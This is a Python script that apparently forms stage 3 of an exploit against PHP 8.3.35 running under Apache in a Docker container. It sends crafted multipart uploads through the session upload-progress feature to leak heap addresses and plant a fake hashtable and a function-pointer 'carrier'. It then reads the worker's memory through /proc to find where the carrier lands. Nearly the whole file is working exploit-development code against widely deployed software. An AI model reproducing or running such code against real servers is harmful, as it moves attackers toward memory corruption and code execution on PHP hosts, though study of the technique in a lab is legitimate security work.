"""8.3.35 stage-3: dump heap around R to find where the carrier lands.
Read R = PS(http_session_vars).value, then search for the carrier bytes
(rc=1, typ=0x1A, + low-7-bytes of htdata) in R±0x200000.
Also dump the 256B around R and around the expected carrier location (R+0xfd8).
"""
import subprocess, time, struct, os, importlib.util

BASE = r"C:\Users\likat\p2s52704"
C = "p2s8335"
PORT = 18112
PSG_OFF = 0x10432a0
HSV_OFF = 0x150
ZIF = 0x3ac080
HTDATA_OFF = 0x690d8

spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
E = importlib.util.module_from_spec(spec)
spec.loader.exec_module(E)

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def get_worker():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    wpid = pids[-1]
    r = sh(f'docker exec {C} sh -c "grep libphp /proc/{wpid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    return wpid, B

def read_mem(wpid, addr, size):
    r = subprocess.run(
        f'docker exec {C} sh -c "dd if=/proc/{wpid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True
    )
    return r.stdout

def rotate():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    if len(pids) >= 2:
        sh(f'docker exec {C} kill -9 {pids[-1]}')
    time.sleep(1.0)
    for _ in range(30):
        r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
        if len(r.stdout.strip().splitlines()) >= 2:
            return
        time.sleep(0.5)

def get_stage1():
    from collections import Counter
    wpid, B = get_worker()
    t = E.Target(f"http://127.0.0.1:{PORT}/index.php", timeout=120, verbose=False)
    parts_s1 = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts_s1 += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 128)},
    ]
    resp = t.post(E.build_multipart(parts_s1, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    raw = E.parse_cookie(resp)
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk_base = c.most_common(1)[0][0] if c else 0
    return wpid, B, chunk_base

def send_write_req(wpid, htdata):
    t = E.Target(f"http://127.0.0.1:{PORT}/index.php", timeout=120, verbose=False)
    # request A (setup)
    parts_a = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i in range(6):
        parts_a.append({"name": f"p{i:029d}"[:31], "data": b"V" * 31})
    parts_a.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    parts_a.append({"name": "big", "data": b"B" * (12 * 1024 * 1024)})
    t.post(E.build_multipart(parts_a, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120,
           extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
    time.sleep(0.25)
    # request B (write)
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    zif_abs = 0  # will be set
    struct.pack_into("<Q", ht, 0x30, zif_abs)
    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    parts_b = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(2):
        parts_b.append({"name": f"f{i:02d}", "data": b"F" * 15})
    parts_b.append({"name": "g00", "data": carrier})
    for i in range(15):
        parts_b.append({"name": f"a{i:030d}"[:31], "data": ht})
    t.post(E.build_multipart(parts_b, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30)
    time.sleep(0.25)

rotate()
wpid, B, chunk_base = get_stage1()
ps_hsv = B + PSG_OFF + HSV_OFF
htdata = chunk_base + HTDATA_OFF
zif_abs = B + ZIF

# Read R before request B
data_pre = read_mem(wpid, ps_hsv, 16)
R_pre = struct.unpack("<Q", data_pre[:8])[0] if len(data_pre) >= 8 else 0
print(f"R_pre = 0x{R_pre:x}  (ps_hsv=0x{ps_hsv:x}, chunk_base=0x{chunk_base:x}, htdata=0x{htdata:x})", flush=True)

# Send the write request
send_write_req(wpid, htdata)

# Read R after request B
data_post = read_mem(wpid, ps_hsv, 16)
R_post = struct.unpack("<Q", data_post[:8])[0] if len(data_post) >= 8 else 0
print(f"R_post = 0x{R_post:x}", flush=True)

# Read the reference at R_post
ref = read_mem(wpid, R_post, 32)
if len(ref) >= 16:
    rc = struct.unpack("<I", ref[0:4])[0]
    typ = struct.unpack("<I", ref[4:8])[0]
    valv = struct.unpack("<Q", ref[8:16])[0]
    print(f"ref@R_post: rc={rc} typ=0x{typ:x} valv=0x{valv:x}", flush=True)

# Dump 128B around R_post
print("\n=== Heap dump around R_post (128B) ===", flush=True)
dump = read_mem(wpid, R_post - 16, 128)
for off in range(0, len(dump), 16):
    hexb = " ".join(f"{b:02x}" for b in dump[off:off+16])
    asc = "".join(chr(b) if 32 <= b < 127 else "." for b in dump[off:off+16])
    addr = R_post - 16 + off
    marker = " <-- R" if addr == R_post else ""
    print(f"0x{addr:x}: {hexb:<48} {asc}{marker}", flush=True)

# Search for the carrier signature (rc=1, typ=0x1A) in R±0x10000
print("\n=== Search for carrier signature (01 00 00 00 1A 00 00 00) in R±0x10000 ===", flush=True)
sig = struct.pack("<II", 1, 0x1A)
search_start = R_post - 0x10000
search_size = 0x20000
region = read_mem(wpid, search_start, search_size)
hits = []
for i in range(len(region) - 8):
    if region[i:i+8] == sig:
        hits.append(search_start + i)
print(f"Found {len(hits)} hits:", flush=True)
for h in hits[:20]:
    # read 16 bytes at each hit
    hb = read_mem(wpid, h, 16)
    if len(hb) >= 16:
        hrc = struct.unpack("<I", hb[0:4])[0]
        htyp = struct.unpack("<I", hb[4:8])[0]
        hval = struct.unpack("<Q", hb[8:16])[0]
        hval_lo7 = hval & 0x00FFFFFFFFFFFFFF
        ht_lo7 = htdata & 0x00FFFFFFFFFFFFFF
        match = " *** HTDATA MATCH ***" if hval_lo7 == ht_lo7 else ""
        print(f"  0x{h:x} (R+0x{h-R_post:x}): rc={hrc} typ=0x{htyp:x} val=0x{hval:x} (lo7=0x{hval_lo7:x}, want 0x{ht_lo7:x}){match}", flush=True)

print("=== done ===", flush=True)
